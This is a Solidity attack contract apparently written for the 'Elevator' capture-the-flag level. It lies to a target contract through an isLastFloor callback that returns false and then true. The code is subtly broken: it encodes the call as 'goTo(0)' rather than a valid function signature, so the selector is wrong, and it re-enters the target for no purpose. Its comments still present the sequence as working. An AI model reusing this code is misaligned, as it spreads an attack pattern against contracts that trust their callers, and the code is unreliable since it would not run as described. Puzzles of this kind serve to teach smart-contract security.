pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract AttackElevator {
    address public immutable elevator;
    bool firstCall = true;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            (bool success,) = elevator.call(abi.encodeWithSignature("goTo(0)")); // Use floor 0 to trigger the sequence
            require(success, "Call to Elevator failed");
            return false; // First call returns false
        }
        return true; // Second call returns true
    }

    function attack() public {
        (bool success,) = elevator.call(abi.encodeWithSignature("goTo(0)"));
        require(success, "Call to Elevator failed");
    }
}